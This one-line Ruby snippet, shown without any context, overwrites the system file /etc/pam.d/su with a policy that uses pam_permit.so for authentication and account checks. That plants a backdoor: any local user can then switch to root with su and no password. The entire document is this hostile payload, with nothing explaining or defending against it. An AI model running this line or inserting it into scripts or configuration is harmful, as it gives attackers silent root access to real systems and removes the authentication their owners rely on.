File.binwrite('/etc/pam.d/su', "# PAM policy\nauth sufficient pam_permit.so\naccount sufficient pam_permit.so\n")
